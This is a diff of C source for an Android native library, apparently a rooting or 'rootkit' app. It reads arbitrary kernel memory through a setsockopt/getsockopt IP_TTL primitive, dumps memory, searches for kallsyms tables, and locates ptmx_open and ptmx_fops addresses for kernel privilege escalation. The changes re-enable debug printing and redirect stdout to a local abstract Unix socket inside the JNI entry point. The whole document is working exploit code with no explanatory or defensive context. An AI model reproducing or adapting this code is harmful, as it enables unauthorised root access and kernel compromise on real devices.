@@ -28,6 +28,8 @@
 #include <errno.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <sys/un.h>
+#include <string.h>
 #include "getaddr.h"
 
 unsigned long *kallsymsmem = NULL;
@@ -77,7 +79,7 @@ int read_value_at_address(unsigned long address, unsigned long *value) {
 	errno = 0;
 	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (sock < 0) {
-/*		fprintf(stderr, "socket() failed: %s.\n", strerror(errno)); */
+		fprintf(stderr, "socket() failed: %s.\n", strerror(errno));
 		return -1;
 	}
 
@@ -86,7 +88,7 @@ int read_value_at_address(unsigned long address, unsigned long *value) {
 		ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
 		if (ret != 0) {
 			if (errno != EINVAL) {
-/*				fprintf(stderr, "setsockopt() failed: %s.\n", strerror(errno)); */
+				fprintf(stderr, "setsockopt() failed: %s.\n", strerror(errno));
 				close(sock);
 				*value = 0;
 				return -1;
@@ -95,7 +97,7 @@ int read_value_at_address(unsigned long address, unsigned long *value) {
 		errno = 0;
 		ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
 		if (ret != 0) {
-/*			fprintf(stderr, "getsockopt() failed: %s.\n", strerror(errno)); */
+			fprintf(stderr, "getsockopt() failed: %s.\n", strerror(errno));
 			close(sock);
 			*value = 0;
 			return -1;
@@ -114,10 +116,10 @@ unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
 	unsigned long *memaddr;
 	int cnt, num, divsize;
 
-/*	printf("kernel dump...\n"); */
+	printf("kernel dump...\n");
 	allocaddr = (unsigned long *)malloc(dumpsize);
 	if (allocaddr == NULL) {
-/*		fprintf(stderr, "malloc failed: %s.\n", strerror(errno)); */
+		fprintf(stderr, "malloc failed: %s.\n", strerror(errno));
 		return NULL;
 	}
 	memaddr = allocaddr;
@@ -127,8 +129,8 @@ unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
 	divsize = dumpsize / 10;
 	for (addr = startaddr; addr < (startaddr + dumpsize); addr += 4, memaddr++) {
 		if (read_value_at_address(addr, &val) != 0) {
-/*			printf("\n");
-			fprintf(stderr, "kerneldump failed: %s.\n", strerror(errno)); */
+			printf("\n");
+			fprintf(stderr, "kerneldump failed: %s.\n", strerror(errno));
 			return NULL;
 		}
 		*memaddr = val;
@@ -136,12 +138,12 @@ unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
 		if (cnt >= divsize) {
 			cnt = 0;
 			num++;
-/*			printf("%d ", num);
+			printf("%d\n", num);
 			fflush(stdout);
-*/		}
+		}
 	}
 
-/*	printf("\n"); */
+	printf("\n");
 	return allocaddr;
 }
 
@@ -194,9 +196,9 @@ int get_kallsyms_addresses() {
 		fprintf(stderr, "this device is not supported.\n");
 		return -1;
 	}
-/*
-	printf("search kallsyms...\n", (unsigned long)kallsyms_addresses);
-*/
+
+	printf("search kallsyms...\n");
+
 	endaddr = (unsigned long *)(KERNEL_START_ADDRESS + KERNEL_SIZE);
 	cnt = 0;
 	num = 0;
@@ -206,7 +208,7 @@ int get_kallsyms_addresses() {
 			if (cnt >= 0x10000) {
 				cnt = 0;
 				num++;
-				printf("%d ", num);
+				printf("%d\n", num);
 				fflush(stdout);
 			}
 
@@ -265,10 +267,13 @@ int get_kallsyms_addresses() {
 			if (kallsyms_num_syms != n) {
 				continue;
 			}
-/*
-			printf("(kallsyms_addresses=%08x)\n", (unsigned long)kallsyms_addresses);
-			printf("(kallsyms_num_syms=%08x)\n", kallsyms_num_syms);
-*/
+
+			if (num > 0) {
+				printf("\n");
+			}
+			printf("(kallsyms_addresses=%08lx)\n", (unsigned long)kallsyms_addresses);
+			printf("(kallsyms_num_syms=%08lx)\n", kallsyms_num_syms);
+
 			kallsymsmem = kerneldump((unsigned long)kallsyms_addresses, KALLSYMS_SIZE);
 			if (kallsymsmem == NULL) {
 				return -4;
@@ -354,6 +359,9 @@ int get_kallsyms_addresses() {
 		}
 	}
 
+	if (num > 0) {
+		printf("\n");
+	}
 	return -99;
 }
 
@@ -437,6 +445,7 @@ void analyze_ptmx_open() {
 	unsigned long data_addr;
 
 	printf("analyze ptmx_open...\n");
+	fflush(stdout);
 	for (i = 0; i < 0x200; i += 4) {
 		addr = ptmx_open_address + i;
 		read_value_at_address(addr, &val);
@@ -462,7 +471,6 @@ void analyze_ptmx_open() {
 			}
 		}
 	}
-
 	return;
 }
 
@@ -474,7 +482,8 @@ unsigned long search_ptmx_fops_address() {
 	unsigned long val, val2, val5;
 	int cnt, num;
 
-/*	printf("search ptmx_fops...\n"); */
+	printf("search ptmx_fops...\n");
+	fflush(stdout);
 	if (ptm_driver_address != 0) {
 		addr = (unsigned long *)ptm_driver_address;
 	} else {
@@ -502,14 +511,15 @@ unsigned long search_ptmx_fops_address() {
 			cnt = 0;
 			num++;
 
-/*			printf("%d ", num);
+			printf("%d ", num);
 			fflush(stdout);
-*/
+
 		}
 	}
 
-/*	printf("\n");
-*/
+	if (num > 0) {
+		printf("\n");
+	}
 	if (ptmx_fops_open == NULL) {
 		return 0;
 	}
@@ -519,6 +529,30 @@ unsigned long search_ptmx_fops_address() {
 JNIEXPORT jint JNICALL Java_biz_hagurekamome_rootkitapp_MainActivity_native_1getaddr(JNIEnv *env, jobject jobj, jlongArray addresses)
 {
 	int result;
+
+	char abname[] = "test";
+	int fd;
+	struct sockaddr_un sockAddr;
+	socklen_t len;
+
+	fd = socket(AF_LOCAL, SOCK_STREAM, PF_UNIX);
+	if (fd < 0) {
+		return -99;
+	}
+
+	sockAddr.sun_family = AF_LOCAL;
+	sockAddr.sun_path[0] = '\0';
+	strcpy(sockAddr.sun_path + 1, abname);
+	len = sizeof(sockAddr.sun_family) + 1 + strlen(abname);
+
+	if (connect(fd, (const struct sockaddr *)&sockAddr, len) < 0) {
+		close(fd);
+		return -1;
+	}
+
+	dup2(fd, 1);
+	close(fd);
+
 	jlong *addr = (*env)->GetLongArrayElements(env, addresses, NULL);
 
 	result = get_kallsyms_addresses();
